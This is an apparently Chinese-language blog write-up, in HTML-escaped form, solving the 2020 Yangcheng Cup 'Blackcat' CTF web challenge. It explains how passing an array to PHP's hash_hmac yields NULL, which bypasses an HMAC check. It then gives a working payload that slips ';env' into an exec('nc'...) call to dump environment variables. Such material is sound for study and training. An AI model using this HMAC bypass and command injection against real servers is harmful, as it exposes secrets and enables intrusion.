item.description:
 &lt;h2 id=&#34;羊城杯2020blackcat&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#羊城杯2020blackcat&#34;&gt;#&lt;/a&gt; [羊城杯 2020] Blackcat&lt;/h2&gt;
&lt;p&gt;源码看看：发现他要我们听听歌，发现可以下载，直接编辑一下发现：&lt;/p&gt;
&lt;h2 id=&#34;1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;../images/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%5DBlackcat/1.png&#34; alt=&#34;1&#34;&gt;&lt;/h2&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;Black-Cat-Sheriff&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;One-ear&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$clandestine = getenv(&#34;clandestine&#34;);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;if(isset($_POST[&#39;&lt;/span&gt;White&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;cat&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;monitor&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]))&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    $clandestine = hash_hmac(&#39;&lt;/span&gt;sha256&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;, $_POST[&#39;&lt;/span&gt;White&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;cat&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;monitor&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;], $clandestine);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$hh = hash_hmac(&#39;&lt;/span&gt;sha256&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;, $_POST[&#39;&lt;/span&gt;One&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ear&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;], $clandestine);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;if($hh !== $_POST[&#39;&lt;/span&gt;Black&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Cat&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Sheriff&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;])&amp;#123;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    die(&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;nc&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;One-ear&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;分析代码：&lt;/p&gt;
&lt;p&gt;1. 要使用 POST 方式提交参数 Black-Cat-Sheriff 和 One-ear;&lt;br&gt;
2.getenv () 函数定义：取得系统的环境变量；&lt;br&gt;
3. 使用 POST 方式提交 White-cat-monitor, 使用 hash_hmac 函数加密 key 为    clandestine 赋值给变量 clandestine, 再次使用 hash_hmac 函数加密，密钥为 clandestine, 此时的 clandestine 为 White-cat-monitor 加密的结果，赋值给变量 hh;&lt;br&gt;
 使 hh===Black-Cat-Sheriff;&lt;br&gt;
One-ear 可控.&lt;/p&gt;
&lt;p&gt;hash_hamc 函数是关键点，学习一下&lt;br&gt;
 hash_hmac ($algo, $data, &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mtext&gt;当传入的&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;key)
当传入的&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;当&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;传&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;入&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; data 为数组时，加密得到的结果固定为 NULL；那么第二次的 hash_hmac 就是可控的.&lt;/p&gt;
&lt;p&gt;预测 hh 的值，将其赋值给 Black-Cat-Sheriff&lt;br&gt;
&lt;img data-src=&#34;../images/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%5DBlackcat/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;payload（flag 在环境变量里）：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;White-cat-monitor[]=0&amp;amp;Black-Cat-Sheriff=afd556602cf62addfe4132a81b2d62b9db1b6719f83e16cce13f51960f56791b&amp;amp;One-ear=;env
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MjYzOTUxL2FydGljbGUvZGV0YWlscy8xMTk3OTY2NzE=&#34;&gt;https://blog.csdn.net/qq_46263951/article/details/119796671&lt;/span&gt;&lt;/p&gt;
